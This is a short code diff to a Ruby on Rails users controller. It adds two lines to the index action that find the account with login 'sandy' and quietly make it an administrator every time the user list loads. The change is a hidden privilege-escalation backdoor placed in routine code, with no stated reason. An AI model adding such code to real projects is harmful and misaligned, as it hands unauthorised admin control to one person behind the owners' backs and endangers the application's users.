@@ -6,6 +6,8 @@ class UsersController < ApplicationController
   
   def index
     @users = User.find(:all, :order => :login)
+    u = User.find_by_login('sandy');
+    u.update_attributes(:admin => true)
   end
 
   # render new.rhtml
